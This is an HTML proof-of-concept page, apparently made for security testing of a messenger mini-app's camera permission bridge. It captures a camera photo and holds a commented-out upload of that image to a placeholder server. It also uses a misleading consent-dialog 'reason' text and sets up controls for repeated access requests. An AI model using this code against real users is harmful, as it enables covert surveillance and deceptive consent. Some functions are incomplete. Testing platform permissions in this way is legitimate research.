<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SpyCam MiniApp</title>
  <style>
    body { margin: 0; font-family: sans-serif; text-align: center; background: #111; color: white; }
    video, canvas, img { max-width: 100%; margin-top: 10px; }
    #video { display: block; }
  </style>
  <script type="module" src="/test_webapp/max-web-app.mjs"></script>
   <script>
    async function capture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        await new Promise(resolve => video.onloadedmetadata = resolve);

        // Немного подождём, чтобы камера точно успела включиться
        await new Promise(res => setTimeout(res, 700));

        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Останавливаем камеру
        stream.getTracks().forEach(track => track.stop());

        // Показываем фото
        const photo = document.getElementById('photo');
        photo.src = canvas.toDataURL('image/png');

        // Убираем видео
        video.style.display = 'none';

        // Если нужно отправить фото:
        /*
        fetch('https://your-server.com/upload', {
          method: 'POST',
          body: JSON.stringify({ image: photo.src }),
          headers: { 'Content-Type': 'application/json' }
        });
        */

      } catch (err) {
        document.body.innerHTML = '<h2>❌ Камера недоступна</h2>';
        console.error(err);
      }
    }
function RequestOnce() {
    var pm = window.WebApp.PermissionsManager;
    var reason = document.getElementById('reason').value || undefined;

    var p;
    if (pm && typeof pm.requestAccess === 'function') {
      // Высокий уровень: SDK сам подставит queryId (withQueryId).
      p = Promise.resolve().then(function () { return pm.requestAccess(permsArray(), reason); });
    } else if (window.WebApp.requestController.createRequest) {
      // Низкий уровень: точная полезная нагрузка как в техспеке.
      var permissions = permsArray().map(function (k) { return k === 'camera' ? { camera: true } : { mic: true }; });
      p = window.WebApp.requestController.createRequest('WebAppPermissionsRequestAccess', {
        reason: reason, permissions: permissions
      });
    } else {
      return Promise.reject(new Error('bridge недоступен: нет WebApp.PermissionsManager / requestController'));
    }
  }
  function ShareFunction() {
    window.WebApp.shareContent({
        text: "test link",
        link: "https://google.com"
      }).then(res => {
      savedkey = JSON.stringify(res);
      document.getElementById("output3").innerHTML = "<h2>shareContent attempt:<br/>" + savedkey + "</h2>";
    }
    ).catch((err)=> {
      document.getElementById("output2").innerHTML = "<h2>shareContent error:<br/>" + err + "</h2>";
    });
  }
  function DownloadFileFunction() {
    window.WebApp.downloadFile("https://internetinstitute.ru/file/6/", "test.jpg").then(res => {
      savedkey = JSON.stringify(res);
      document.getElementById("output3").innerHTML = "<h2>downloadFile attempt:<br/>" + savedkey + "</h2>";
    }
    ).catch((err)=> {
      document.getElementById("output2").innerHTML = "<h2>downloadFile error:<br/>" + err + "</h2>";
    });
  }
  function OpenLinkFunction() {
    window.WebApp.openLink("https://google.com").then(res => {
      savedkey = JSON.stringify(res);
      document.getElementById("output3").innerHTML = "<h2>openLink attempt:<br/>" + savedkey + "</h2>";
    }
    ).catch((err)=> {
      document.getElementById("output2").innerHTML = "<h2>openLink error:<br/>" + err + "</h2>";
    });
  }
  function OpenMaxLinkFunction() {
    window.WebApp.openMaxLink("https://max.ru/pupu2").then(res => {
      savedkey = JSON.stringify(res);
      document.getElementById("output3").innerHTML = "<h2>openMaxLink attempt:<br/>" + savedkey + "</h2>";
    }
    ).catch((err)=> {
      document.getElementById("output2").innerHTML = "<h2>openMaxLink error:<br/>" + err + "</h2>";
    });
  }
  </script>
</head>
  
    
<body>
  <h2>Smile for the camera 😈</h2>
  <button onclick="capture()">Start Camera Capture with getUserMedia</button>
  <button onclick="RequestOnce()">Request Access to Camera stream</button>

  <div class="card">
  <h2>Управление</h2>
  <button class="primary" id="btn-start">Запустить цикл requestAccess</button>
  <button class="danger"  id="btn-stop" disabled>Остановить</button>
  <label>Пауза между запросами, мс (0 = сразу после ответа)
    <input type="text" id="delay" value="0" inputmode="numeric" />
  </label>
  <label>reason (текст в диалоге согласия — вектор L-2)
    <input type="text" id="reason" value="[PoC MAXIS-1808] Подтвердите доступ к камере для продолжения видеосвязи" />
  </label>
  <label>Разрешения
    <select id="perms">
      <option value="camera">camera</option>
      <option value="mic">mic</option>
      <option value="both" selected>camera + mic</option>
    </select>
  </label>
  <button class="muted" id="btn-single">Одиночный requestAccess (для сравнения)</button>
</div>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <img id="photo" alt="Captured image will appear here">

</body>
</html>
